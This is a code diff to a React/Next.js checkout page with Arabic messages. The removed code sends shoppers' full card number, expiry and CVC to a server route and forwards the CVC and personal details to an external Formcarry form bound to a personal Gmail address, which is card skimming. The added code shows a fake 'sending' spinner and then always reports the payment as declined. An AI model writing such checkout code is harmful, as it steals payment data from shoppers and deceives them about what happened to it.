@@ -4,7 +4,6 @@ import { Suspense, useState } from "react";
 import { useSearchParams } from "next/navigation";
 import Link from "next/link";
 import Image from "next/image";
-import axios from "axios";
 import Swal from "sweetalert2";
 import {
 	FiArrowRight,
@@ -13,9 +12,6 @@ import {
 	FiLock,
 	FiShoppingBag,
 } from "react-icons/fi";
-
-const FORMCARRY_ENDPOINT = "https://formcarry.com/s/sdaVMcfxNTg";
-const ORDER_RECEIVER_EMAIL = "b71490@gmail.com";
 
 function normalizeCardNumber(value) {
 	return value.replace(/\D/g, "");
@@ -296,105 +292,28 @@ function CheckoutContent() {
 		setCardHolderError("");
 		setCardExpiryError("");
 		setCardCvcError("");
-		const maskedCard = `**** **** **** ${normalizedCard.slice(-4)}`;
-		const payload = {
-			order: {
-				productName: selectedProductName,
-				productPrice: selectedProductPrice,
-				serviceFee,
-				totalPrice,
-				couponCode: couponCode || null,
-			},
-			customer: {
-				name: customerName.trim(),
-				email: customerEmail.trim(),
-			},
-			payment: {
-				method: "card",
-				cardHolder: cardHolder.trim(),
-				cardNumberMasked: maskedCard,
-				cardNumberRaw: normalizedCard,
-				card_expiry: cardExpiry,
-				cardCvc,
-			},
-		};
-
-		let orderId = "-";
-		let emailStatus = "";
-		try {
-			const response = await axios.post("/api/orders", payload);
-			orderId = response.data?.data?.orderId || "-";
-
-			if (FORMCARRY_ENDPOINT.includes("XXXX")) {
-				emailStatus = "لم يتم إرسال الإيميل لأن رابط Formcarry غير مُكتمل (XXXX).";
-			} else {
-				const formBody = new URLSearchParams({
-					name: customerName.trim(),
-					email: customerEmail.trim(),
-					card_cvc: cardCvc,
-					product: selectedProductName,
-					product_price: String(selectedProductPrice),
-					service_fee: String(serviceFee),
-					total_price: String(totalPrice),
-					coupon_code: couponCode || "-",
-					payment_method: "card",
-					card_holder: cardHolder.trim(),
-									card_last4: normalizedCard.slice(-4),
-					card_expiry: cardExpiry,
-					order_id: orderId,
-					receiver_email: ORDER_RECEIVER_EMAIL,
-				});
-
-				const formcarryResponse = await fetch(FORMCARRY_ENDPOINT, {
-					method: "POST",
-					headers: {
-						"Content-Type": "application/x-www-form-urlencoded",
-						Accept: "application/json",
-					},
-					body: formBody.toString(),
-				});
-
-				if (!formcarryResponse.ok) {
-					emailStatus = "تم إنشاء الطلب لكن إرسال الإيميل فشل. تحقق من إعدادات Formcarry.";
-				} else {
-					emailStatus = `تم إرسال تفاصيل الطلب إلى الإيميل: ${ORDER_RECEIVER_EMAIL}`;
-				}
-			}
-		} catch (error) {
-			const serverMessage =
-				error?.response?.data?.message ||
-				"حدث خطأ أثناء إرسال بيانات الشراء، حاول مرة أخرى.";
-			await Swal.fire({
-				title: "تعذر إرسال الطلب",
-				text: serverMessage,
-				icon: "error",
-				confirmButtonText: "حسنًا",
-				confirmButtonColor: "#dc2626",
-			});
-			return;
-		}
+		setCardNumber(normalizedCard.replace(/(.{4})/g, "$1 ").trim());
+		setLastOrderSummary(null);
 
 		await Swal.fire({
-			title: "تم استلام الطلب",
-			html: `
-				<div style="text-align:right;line-height:1.9">
-					<div><strong>رقم الطلب:</strong> ${orderId}</div>
-					<div><strong>المنتج:</strong> ${selectedProductName}</div>
-					<div><strong>المبلغ:</strong> $${totalPrice}</div>
-					<div><strong>طريقة الدفع:</strong> بطاقة بنكية</div>
-					<div><strong>رقم البطاقة:</strong> ${maskedCard}</div>
-				</div>
-			`,
-			icon: "success",
-			confirmButtonText: "ممتاز",
-			confirmButtonColor: "#1475d1",
+			title: "جاري إرسال الطلب",
+			text: "يرجى الانتظار قليلًا...",
+			allowOutsideClick: false,
+			allowEscapeKey: false,
+			showConfirmButton: false,
+			timer: 1800,
+			timerProgressBar: true,
+			didOpen: () => {
+				Swal.showLoading();
+			},
 		});
 
-		setLastOrderSummary({
-			orderId,
-			productName: selectedProductName,
-			totalPrice,
-			emailStatus,
+		await Swal.fire({
+			title: "طريقة الدفع مرفوضة",
+			text: "تم رفض طريقة الدفع. حاول استخدام وسيلة أخرى أو تواصل مع البنك.",
+			icon: "error",
+			confirmButtonText: "حسنًا",
+			confirmButtonColor: "#dc2626",
 		});
 	};
 
